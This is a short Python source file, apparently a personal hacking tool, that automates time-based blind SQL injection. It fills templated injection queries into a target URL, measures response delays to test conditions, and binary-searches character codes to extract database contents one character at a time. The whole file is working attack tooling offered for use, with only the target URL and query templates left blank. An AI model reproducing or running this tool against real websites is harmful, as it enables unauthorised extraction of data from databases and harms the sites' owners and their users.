__author__ = 'Truong_noob'
import requests
from datetime import datetime
class Blind_magic:
    def __init__(self):
        self.url = ""
        self.base_query = ""
        self.query = ""
        self.condition_query = ""
        self.char = 90
        self.duration = 1
        self.start = 48
        self.end = 122
        self.requests_num = 0
        self.result = []
    def l(self,l1_s=1,l2_s=1,l3_s=1,l4_s=1,l5_s=1,l1=1,l2=1,l3=1,l4=1,l5=1):
        self.l5 = l5 + 1
        self.l5_s = l5_s
        self.l4 = l4 + 1
        self.l4_s = l4_s
        self.l3 = l3 + 1
        self.l3_s = l3_s
        self.l2 = l2 + 1
        self.l2_s = l2_s
        self.l1 = l1 + 1
        self.l1_s = l1_s
    def _full_url(self,l1,l2,l3,l4,l5):
        query = self.query.format(l1=l1,l2=l2,l3=l3,l4=l4,l5=l5)
        condition_query = self.condition_query.format(QUERY=query,l1=l1,l2=l2,l3=l3,l4=l4,l5=l5,OPERATOR='{OPERATOR}',\
                                                      CHAR='{CHAR}')
        base_query = self.base_query.format(CONDITION_QUERY=condition_query)
        return self.url + base_query
    def inc_req(self):
        self.requests_num = self.requests_num + 1
    def _connect_delay(self,full_url,operator):
        full_url = full_url.format(OPERATOR=operator)
        # print full_url
        start_time = datetime.now()
        try:
            r = requests.get(full_url,timeout=self.duration)
        except:
            pass

        self.inc_req()
        end_time = datetime.now()
        diff_time = end_time - start_time
        time_diff = diff_time.seconds
        # print 'time diff='+str(time_diff)
        if time_diff >= self.duration:
            return 1
    def _time_base_handle(self,full_url,mid):
        full_url = full_url.format(CHAR=mid,OPERATOR='{OPERATOR}')
        if self._connect_delay(full_url,'='):
            return 1
        else:
            if  self._connect_delay(full_url,'>'):
                return 2
            else:
                return 3
    def _binary_search(self,full_url,start,end):
        mid = start+(end-start)/2
        if self._time_base_handle(full_url,0)==1:
            return 0
        _timebase_handle_result = self._time_base_handle(full_url,mid)
        if _timebase_handle_result == 1:
            return mid
        elif _timebase_handle_result == 2:
            start = mid +1
        elif _timebase_handle_result == 3:
            end = mid - 1
        if start > end:
            return mid
        return self._binary_search(full_url,start,end)
    def run(self):
        result = ''
        for l5 in range(self.l5):
            for l4 in range(self.l4):
                for l3 in range(self.l3):
                    for l2 in range(self.l2):
                        for l1 in range(1,self.l1):
                            new_result = chr(self._binary_search(self._full_url(l1,l2,l3,l4,l5),self.start,self.end))
                            if new_result == '\x00':
                                break
                            result = result + new_result
                        self.result.append(result)
                        result = ''
